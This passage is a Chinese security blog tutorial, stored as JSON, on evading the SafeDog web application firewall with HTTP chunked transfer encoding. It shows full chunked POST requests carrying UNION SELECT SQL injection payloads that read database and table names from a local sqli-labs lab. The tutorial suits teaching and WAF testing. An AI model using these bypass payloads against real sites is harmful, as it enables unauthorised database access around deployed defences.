{"title":"waf绕过-打狗棒法","uid":"cf78fa225b6de7abf9eac61bd71ce650","slug":"waf绕过-打狗棒法","date":"2023-05-24T02:37:22.000Z","updated":"2023-05-25T08:12:56.632Z","comments":true,"path":"api/articles/waf绕过-打狗棒法.json","keywords":null,"cover":"https://n.sinaimg.cn/sinakd20200428ac/170/w640h330/20200428/cac9-isuiksp1177563.jpg","content":"<h1 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h1><p>某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"环境的搭建：\"><a href=\"#环境的搭建：\" class=\"headerlink\" title=\"环境的搭建：\"></a>环境的搭建：</h2><p>环境的搭建就选择phpstudy2018+安全狗最新版(2022年10月23日前)</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Tip：\n  （<span class=\"token number\">1</span>）记得先在phpstudy的Apache的bin目录下初始化Apache服务，一般来说，第一次为询问是否确认，第二次为确认安装（命令：httpd<span class=\"token operator\">.</span>exe <span class=\"token operator\">-</span>k install <span class=\"token operator\">-</span>n apache2<span class=\"token operator\">.</span><span class=\"token number\">4</span>  用管理员打开）\n  （<span class=\"token number\">2</span>）上传防护中把完整的post包过滤勾选上。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"0x02-HTTP补充：\"><a href=\"#0x02-HTTP补充：\" class=\"headerlink\" title=\"0x02 HTTP补充：\"></a>0x02 HTTP补充：</h1><h2 id=\"分块传输的介绍：\"><a href=\"#分块传输的介绍：\" class=\"headerlink\" title=\"分块传输的介绍：\"></a>分块传输的介绍：</h2><p>分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器向客户端发送的数据分成多个部分，在消息头中指定 Transfer-Encoding: chunked 就表示整个response将使分块传输编译来传输内容。一个消息块由n块组成，并在最后一个大小为0的块结束。<br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-657cf4fc25d8212def8f2b825ccf75785e4e5200.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"请求头Transfer-encoding：\"><a href=\"#请求头Transfer-encoding：\" class=\"headerlink\" title=\"请求头Transfer-encoding：\"></a>请求头Transfer-encoding：</h3><p>官方文档:</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">告知接收方为了可靠地传输报文，已经对其进行了何种编码。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>chunked编码，使用若干个chunk串连接而成，由一个标明长度为0的chunk表示解释，每个chunk分为头部和正文两部分，头部内容定义了下一行传输内容的个数（个数用16进制来进行表示）和数量（一般不写数量，但是为了混淆，这里还是把数量写上去）正文部分就是指定长度的实际内容。两部分之间用(CRLF)来隔开，在最后一个长度为0的chunk中表示结束。<strong>并且长度中是以;作为长度的结束</strong></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">数据包中添加：Transfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\n数字代表下一行的字符所占位数，最后需要用<span class=\"token number\">0</span>独占一行表示结束，结尾需要两个回车<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>当设置这个Transfer-Encoding请求头的时候，会有两个效果：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Content<span class=\"token operator\">-</span>length字段自动忽略\n基于长久化持续推送动态内容（不太了解，但是第三感觉有研究内容）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-773576a686f9e155a2a50b7958971864df8f0bfa.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"HTTP持久化连接：\"><a href=\"#HTTP持久化连接：\" class=\"headerlink\" title=\"HTTP持久化连接：\"></a>HTTP持久化连接：</h3><p>因为现在大多数是http1.1协议版本，所以的话，只在Transfer-Encoding中定义了chunked一种编码格式。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">持久化连接：\n  Http请求是运行在<span class=\"token constant\">TCP</span>连接上的，所以自然有<span class=\"token constant\">TCP</span>的三次握手和四次挥手，慢启动的问题，所以为了提高http的性能，就使用了持久化连接。持久化连接在《计算机网络》中有提及。\n\n  在Http1<span class=\"token operator\">.</span><span class=\"token number\">1</span>的版本中规定了所有连接默认都是持久化连接，除非在请求头上加上Connection：close。来关闭持久化连接。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Content-Type介绍：\"><a href=\"#Content-Type介绍：\" class=\"headerlink\" title=\"Content-Type介绍：\"></a>Content-Type介绍：</h3><p>Content-Type：互联网媒体类型， 也叫MIME类型，在HTTP的协议消息头中，使用Content-Type来表示请求和响应中的媒体数据格式标签，用于区分数据类型。<br>常见Content-Type的格式如下：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Content<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> text<span class=\"token operator\">/</span>html<span class=\"token punctuation\">;</span>\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> application<span class=\"token operator\">/</span>json<span class=\"token punctuation\">;</span>charset<span class=\"token punctuation\">:</span>utf<span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\nContent<span class=\"token operator\">-</span>Type：type<span class=\"token operator\">/</span>subtype <span class=\"token punctuation\">;</span>parameter\nContent<span class=\"token operator\">-</span>Type：application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\nContent<span class=\"token operator\">-</span>Type：multipart<span class=\"token operator\">/</span>form<span class=\"token operator\">-</span>data<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>重点介绍multipart&#x2F;form-data：<br>当服务器使用multipart&#x2F;form-data接收POST请求的时候，服务器如何知道开始位置和结束位置的呢？？？<br>其中就是用了boundary边界来进行操作的。<br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-766c71ee5ae554fa942597fdebfe50e1e4fbc9ab.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"waf绕过的思路：\"><a href=\"#waf绕过的思路：\" class=\"headerlink\" title=\"waf绕过的思路：\"></a>waf绕过的思路：</h1><p>正常传输的payload都是可以被waf的正则匹配到的，而进行分块传输之后的payload，waf的正则不会进行匹配，而又满足http的规则，所以就能绕过waf。<br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-399e8ea44e160a117536c77c868626d9e9a8ce85.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"例如：\"><a href=\"#例如：\" class=\"headerlink\" title=\"例如：\"></a>例如：</h4><p>正常传输过程中是这样的。<br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-3afbe376613e7eee243230eebfa3e8b42006bd96.png\" alt=\"在这里插入图片描述\">那分块传输之后，就变成了这样。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span>sqli<span class=\"token operator\">-</span>labs<span class=\"token operator\">-</span>master<span class=\"token operator\">/</span>Less<span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> <span class=\"token number\">192.168</span><span class=\"token number\">.172</span><span class=\"token number\">.161</span>\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">128</span>\nCache<span class=\"token operator\">-</span>Control<span class=\"token punctuation\">:</span> max<span class=\"token operator\">-</span>age<span class=\"token operator\">=</span><span class=\"token number\">0</span>\nUpgrade<span class=\"token operator\">-</span>Insecure<span class=\"token operator\">-</span>Requests<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span>\nOrigin<span class=\"token punctuation\">:</span> http<span class=\"token punctuation\">:</span><span class=\"token comment\">//192.168.172.161</span>\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\nUser<span class=\"token operator\">-</span>Agent<span class=\"token punctuation\">:</span> Mozilla<span class=\"token operator\">/</span><span class=\"token number\">5.0</span> <span class=\"token punctuation\">(</span>Windows <span class=\"token constant\">NT</span> <span class=\"token number\">10.0</span><span class=\"token punctuation\">;</span> Win64<span class=\"token punctuation\">;</span> x64<span class=\"token punctuation\">)</span> AppleWebKit<span class=\"token operator\">/</span><span class=\"token number\">537.36</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">KHTML</span><span class=\"token punctuation\">,</span> like Gecko<span class=\"token punctuation\">)</span> Chrome<span class=\"token operator\">/</span><span class=\"token number\">106.0</span><span class=\"token number\">.0</span><span class=\"token number\">.0</span> Safari<span class=\"token operator\">/</span><span class=\"token number\">537.36</span>\nAccept<span class=\"token punctuation\">:</span> text<span class=\"token operator\">/</span>html<span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>xhtml<span class=\"token operator\">+</span>xml<span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>xml<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span><span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>avif<span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>webp<span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>apng<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span><span class=\"token operator\">/</span><span class=\"token operator\">*</span><span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.8</span><span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>signed<span class=\"token operator\">-</span>exchange<span class=\"token punctuation\">;</span>v<span class=\"token operator\">=</span>b3<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span>\nReferer<span class=\"token punctuation\">:</span> http<span class=\"token punctuation\">:</span><span class=\"token comment\">//192.168.172.161/sqli-labs-master/Less-11/</span>\nAccept<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> gzip<span class=\"token punctuation\">,</span> deflate\nAccept<span class=\"token operator\">-</span>Language<span class=\"token punctuation\">:</span> zh<span class=\"token operator\">-</span><span class=\"token constant\">CN</span><span class=\"token punctuation\">,</span>zh<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span>\nConnection<span class=\"token punctuation\">:</span> close\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\n\n<span class=\"token number\">4</span>\nunam\n<span class=\"token number\">1</span>\ne\n<span class=\"token number\">1</span>\n<span class=\"token operator\">=</span>\n<span class=\"token number\">4</span>\nadmi\n<span class=\"token number\">1</span>\nn\n<span class=\"token number\">1</span>\n<span class=\"token operator\">&amp;</span>\n<span class=\"token number\">4</span>\npass\n<span class=\"token number\">2</span>\nwd\n<span class=\"token number\">1</span>\n<span class=\"token operator\">=</span>\n<span class=\"token number\">4</span>\nadmi\n<span class=\"token number\">1</span>\nn\n<span class=\"token number\">1</span>\n<span class=\"token operator\">&amp;</span>\n<span class=\"token number\">4</span>\nsubm\n<span class=\"token number\">2</span>\nit\n<span class=\"token number\">1</span>\n<span class=\"token operator\">=</span>\n<span class=\"token number\">4</span>\nSubm\n<span class=\"token number\">2</span>\nit\n<span class=\"token number\">0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-80590f978f9764647c5dd3aafaa2379bbf7a6efa.png\" alt=\"在这里插入图片描述\"></p>\n<p>说明是可以识别分块传输的东西，那么我们就可以构造payload来看是否可以绕过waf。</p>\n<h1 id=\"绕过安全狗的sql注入：\"><a href=\"#绕过安全狗的sql注入：\" class=\"headerlink\" title=\"绕过安全狗的sql注入：\"></a>绕过安全狗的sql注入：</h1><p>这里先解决一下绕过安全狗的方式，在常见的方式中，我们都采用垃圾字符填充的方式来绕过安全狗，虽然效果很好，但是较为复杂，也容易出现被狗咬伤的情况，所以为了解决这一现状，小秦同学翻阅之后发现了分块传输的方式来绕过安全狗。但是分块传输目前来看只能适用于post请求。get请求还是比较难说。</p>\n<h3 id=\"以sql-labs为例：\"><a href=\"#以sql-labs为例：\" class=\"headerlink\" title=\"以sql-labs为例：\"></a>以sql-labs为例：</h3><p>在sqli-labs的第十一关，我们发现了可以用post请求。先正常看看过滤哪些字符，这里开门见山，直接把’union select (database()),2#。这个东西进行了过滤<br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-7114da65711595b0780c0740326f813194bc1b53.png\" alt=\"在这里插入图片描述\"><br>咱们可以尝试使用分块传输的方式来进行绕过。这里在请求头中添加。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Transfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\n这个东西，然后进行分块即可。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"读取数据库名\"><a href=\"#读取数据库名\" class=\"headerlink\" title=\"读取数据库名\"></a>读取数据库名</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span>sqli<span class=\"token operator\">-</span>labs<span class=\"token operator\">-</span>master<span class=\"token operator\">/</span>Less<span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> <span class=\"token number\">192.168</span><span class=\"token number\">.172</span><span class=\"token number\">.161</span>\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">251</span>\nCache<span class=\"token operator\">-</span>Control<span class=\"token punctuation\">:</span> max<span class=\"token operator\">-</span>age<span class=\"token operator\">=</span><span class=\"token number\">0</span>\nUpgrade<span class=\"token operator\">-</span>Insecure<span class=\"token operator\">-</span>Requests<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span>\nOrigin<span class=\"token punctuation\">:</span> http<span class=\"token punctuation\">:</span><span class=\"token comment\">//192.168.172.161</span>\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\nUser<span class=\"token operator\">-</span>Agent<span class=\"token punctuation\">:</span> Mozilla<span class=\"token operator\">/</span><span class=\"token number\">5.0</span> <span class=\"token punctuation\">(</span>Windows <span class=\"token constant\">NT</span> <span class=\"token number\">10.0</span><span class=\"token punctuation\">;</span> Win64<span class=\"token punctuation\">;</span> x64<span class=\"token punctuation\">)</span> AppleWebKit<span class=\"token operator\">/</span><span class=\"token number\">537.36</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">KHTML</span><span class=\"token punctuation\">,</span> like Gecko<span class=\"token punctuation\">)</span> Chrome<span class=\"token operator\">/</span><span class=\"token number\">106.0</span><span class=\"token number\">.0</span><span class=\"token number\">.0</span> Safari<span class=\"token operator\">/</span><span class=\"token number\">537.36</span>\nAccept<span class=\"token punctuation\">:</span> text<span class=\"token operator\">/</span>html<span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>xhtml<span class=\"token operator\">+</span>xml<span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>xml<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span><span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>avif<span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>webp<span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>apng<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span><span class=\"token operator\">/</span><span class=\"token operator\">*</span><span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.8</span><span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>signed<span class=\"token operator\">-</span>exchange<span class=\"token punctuation\">;</span>v<span class=\"token operator\">=</span>b3<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span>\nReferer<span class=\"token punctuation\">:</span> http<span class=\"token punctuation\">:</span><span class=\"token comment\">//192.168.172.161/sqli-labs-master/Less-11/</span>\nAccept<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> gzip<span class=\"token punctuation\">,</span> deflate\nAccept<span class=\"token operator\">-</span>Language<span class=\"token punctuation\">:</span> zh<span class=\"token operator\">-</span><span class=\"token constant\">CN</span><span class=\"token punctuation\">,</span>zh<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span>\nConnection<span class=\"token punctuation\">:</span> close\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\n\n<span class=\"token number\">1</span>\nu\n<span class=\"token number\">4</span>\nname\n<span class=\"token number\">1</span>\n<span class=\"token operator\">=</span>\n<span class=\"token number\">1</span>\n<span class=\"token operator\">&amp;</span>\n<span class=\"token number\">2</span>\npa\n<span class=\"token number\">4</span>\nsswd\n<span class=\"token number\">1</span>\n<span class=\"token operator\">=</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">27</span>\n<span class=\"token number\">2</span>\nun\n<span class=\"token number\">1</span>\ni\n<span class=\"token number\">2</span>\non\n<span class=\"token number\">1</span>\n<span class=\"token operator\">+</span>\n<span class=\"token number\">2</span>\nse\n<span class=\"token number\">1</span>\nl\n<span class=\"token number\">2</span>\nec\n<span class=\"token number\">1</span>\nt\n<span class=\"token number\">1</span>\n<span class=\"token operator\">+</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">28</span>\n<span class=\"token number\">2</span>\nda\n<span class=\"token number\">1</span>\nt\n<span class=\"token number\">2</span>\nab\n<span class=\"token number\">1</span>\na\n<span class=\"token number\">2</span>\nse\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">28</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">29</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">29</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">2</span>C\n<span class=\"token number\">1</span>\n<span class=\"token number\">2</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">23</span>\n<span class=\"token number\">1</span>\n<span class=\"token operator\">&amp;</span>\n<span class=\"token number\">3</span>\nsub\n<span class=\"token number\">3</span>\nmit\n<span class=\"token number\">1</span>\n<span class=\"token operator\">=</span>\n<span class=\"token number\">3</span>\nSub\n<span class=\"token number\">3</span>\nmit\n<span class=\"token number\">0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-b0040031d9ff8193c52ccf29610de6d119661a77.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"读取表名：\"><a href=\"#读取表名：\" class=\"headerlink\" title=\"读取表名：\"></a>读取表名：</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span>sqli<span class=\"token operator\">-</span>labs<span class=\"token operator\">-</span>master<span class=\"token operator\">/</span>Less<span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> <span class=\"token number\">192.168</span><span class=\"token number\">.172</span><span class=\"token number\">.161</span>\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">619</span>\nCache<span class=\"token operator\">-</span>Control<span class=\"token punctuation\">:</span> max<span class=\"token operator\">-</span>age<span class=\"token operator\">=</span><span class=\"token number\">0</span>\nUpgrade<span class=\"token operator\">-</span>Insecure<span class=\"token operator\">-</span>Requests<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span>\nOrigin<span class=\"token punctuation\">:</span> http<span class=\"token punctuation\">:</span><span class=\"token comment\">//192.168.172.161</span>\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\nUser<span class=\"token operator\">-</span>Agent<span class=\"token punctuation\">:</span> Mozilla<span class=\"token operator\">/</span><span class=\"token number\">5.0</span> <span class=\"token punctuation\">(</span>Windows <span class=\"token constant\">NT</span> <span class=\"token number\">10.0</span><span class=\"token punctuation\">;</span> Win64<span class=\"token punctuation\">;</span> x64<span class=\"token punctuation\">)</span> AppleWebKit<span class=\"token operator\">/</span><span class=\"token number\">537.36</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">KHTML</span><span class=\"token punctuation\">,</span> like Gecko<span class=\"token punctuation\">)</span> Chrome<span class=\"token operator\">/</span><span class=\"token number\">106.0</span><span class=\"token number\">.0</span><span class=\"token number\">.0</span> Safari<span class=\"token operator\">/</span><span class=\"token number\">537.36</span>\nAccept<span class=\"token punctuation\">:</span> text<span class=\"token operator\">/</span>html<span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>xhtml<span class=\"token operator\">+</span>xml<span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>xml<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span><span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>avif<span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>webp<span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>apng<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span><span class=\"token operator\">/</span><span class=\"token operator\">*</span><span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.8</span><span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>signed<span class=\"token operator\">-</span>exchange<span class=\"token punctuation\">;</span>v<span class=\"token operator\">=</span>b3<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span>\nReferer<span class=\"token punctuation\">:</span> http<span class=\"token punctuation\">:</span><span class=\"token comment\">//192.168.172.161/sqli-labs-master/Less-11/</span>\nAccept<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> gzip<span class=\"token punctuation\">,</span> deflate\nAccept<span class=\"token operator\">-</span>Language<span class=\"token punctuation\">:</span> zh<span class=\"token operator\">-</span><span class=\"token constant\">CN</span><span class=\"token punctuation\">,</span>zh<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span>\nConnection<span class=\"token punctuation\">:</span> close\nTransfer<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> chunked\n\n<span class=\"token number\">1</span>\nu\n<span class=\"token number\">2</span>\nna\n<span class=\"token number\">1</span>\nm\n<span class=\"token number\">1</span>\ne\n<span class=\"token number\">1</span>\n<span class=\"token operator\">=</span>\n<span class=\"token number\">1</span>\n<span class=\"token operator\">&amp;</span>\n<span class=\"token number\">2</span>\npa\n<span class=\"token number\">2</span>\nss\n<span class=\"token number\">2</span>\nwd\n<span class=\"token number\">1</span>\n<span class=\"token operator\">=</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">27</span>\n<span class=\"token number\">1</span>\nu\n<span class=\"token number\">2</span>\nni\n<span class=\"token number\">1</span>\no\n<span class=\"token number\">1</span>\nn\n<span class=\"token number\">1</span>\n<span class=\"token operator\">+</span>\n<span class=\"token number\">2</span>\nse\n<span class=\"token number\">2</span>\nle\n<span class=\"token number\">1</span>\nc\n<span class=\"token number\">1</span>\nt\n<span class=\"token number\">1</span>\n<span class=\"token operator\">+</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">28</span>\n<span class=\"token number\">2</span>\nse\n<span class=\"token number\">1</span>\nl\n<span class=\"token number\">1</span>\ne\n<span class=\"token number\">2</span>\nct\n<span class=\"token number\">1</span>\n<span class=\"token operator\">+</span>\n<span class=\"token number\">2</span>\ngr\n<span class=\"token number\">2</span>\nou\n<span class=\"token number\">1</span>\np\n<span class=\"token number\">1</span>\n<span class=\"token constant\">_</span>\n<span class=\"token number\">2</span>\nco\n<span class=\"token number\">2</span>\nnc\n<span class=\"token number\">2</span>\nat\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">28</span>\n<span class=\"token number\">2</span>\nta\n<span class=\"token number\">2</span>\nbl\n<span class=\"token number\">1</span>\ne\n<span class=\"token number\">1</span>\n<span class=\"token constant\">_</span>\n<span class=\"token number\">2</span>\nna\n<span class=\"token number\">2</span>\nme\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">29</span>\n<span class=\"token number\">1</span>\n<span class=\"token operator\">+</span>\n<span class=\"token number\">2</span>\nfr\n<span class=\"token number\">2</span>\nom\n<span class=\"token number\">1</span>\n<span class=\"token operator\">+</span>\n<span class=\"token number\">2</span>\nin\n<span class=\"token number\">2</span>\nfo\n<span class=\"token number\">1</span>\nr\n<span class=\"token number\">3</span>\nmat\n<span class=\"token number\">2</span>\nio\n<span class=\"token number\">1</span>\nn\n<span class=\"token number\">1</span>\n<span class=\"token constant\">_</span>\n<span class=\"token number\">2</span>\nsc\n<span class=\"token number\">3</span>\nhem\n<span class=\"token number\">1</span>\na\n<span class=\"token number\">1</span>\n<span class=\"token operator\">.</span>\n<span class=\"token number\">2</span>\nta\n<span class=\"token number\">2</span>\nbl\n<span class=\"token number\">2</span>\nes\n<span class=\"token number\">1</span>\n<span class=\"token operator\">+</span>\n<span class=\"token number\">2</span>\nwh\n<span class=\"token number\">2</span>\ner\n<span class=\"token number\">1</span>\ne\n<span class=\"token number\">1</span>\n<span class=\"token operator\">+</span>\n<span class=\"token number\">2</span>\nta\n<span class=\"token number\">2</span>\nbl\n<span class=\"token number\">1</span>\ne\n<span class=\"token number\">1</span>\n<span class=\"token constant\">_</span>\n<span class=\"token number\">2</span>\nsc\n<span class=\"token number\">2</span>\nhe\n<span class=\"token number\">1</span>\nm\n<span class=\"token number\">1</span>\na\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">3</span>D\n<span class=\"token number\">2</span>\nda\n<span class=\"token number\">1</span>\nt\n<span class=\"token number\">2</span>\nab\n<span class=\"token number\">3</span>\nase\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">28</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">29</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">29</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">2</span>C\n<span class=\"token number\">1</span>\n<span class=\"token number\">2</span>\n<span class=\"token number\">3</span>\n<span class=\"token operator\">%</span><span class=\"token number\">23</span>\n<span class=\"token number\">1</span>\n<span class=\"token operator\">&amp;</span>\n<span class=\"token number\">2</span>\nsu\n<span class=\"token number\">3</span>\nbmi\n<span class=\"token number\">1</span>\nt\n<span class=\"token number\">1</span>\n<span class=\"token operator\">=</span>\n<span class=\"token number\">2</span>\nSu\n<span class=\"token number\">4</span>\nbmit\n<span class=\"token number\">0</span><span aria-hidden=\"true\" 